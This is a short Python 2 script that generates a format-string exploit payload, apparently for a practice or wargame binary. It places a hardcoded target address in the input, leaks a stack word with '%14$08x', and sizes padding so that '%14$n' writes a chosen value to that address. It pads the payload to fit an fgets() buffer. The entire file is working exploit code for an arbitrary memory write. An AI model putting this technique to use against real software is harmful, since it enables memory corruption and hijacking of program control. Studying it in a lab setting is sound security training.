#!/usr/bin/python2.6

import struct

def pad(s, length=500):
    assert(len(s) <= length)
    return (s+"A"*length)[:length]
target_value = 0x01025544 # == 16930116 decimal

alignment_padding = ""
before_padding = "AAAA" + "AAAA"
target_address = struct.pack("P", 0x080496f4)
after_padding = "BBBB" + "BBBB"

payload = alignment_padding + before_padding + target_address + after_padding
payload = payload + " 0x%14$08x "

padding = target_value - (    
    len(alignment_padding)  + 
    len(before_padding)     + 
    len(target_address)     + 
    len(after_padding)      + 
    3+8+1                     # 3 for "0x", 8 for the printed hex number, 1 for " "
)
payload = payload + "%" + str(padding) + "d" + "%14$n"

payload = pad(
    payload,
    511 # Man page: fgets()  reads  in  at  most one less than size characters
)
print(payload)
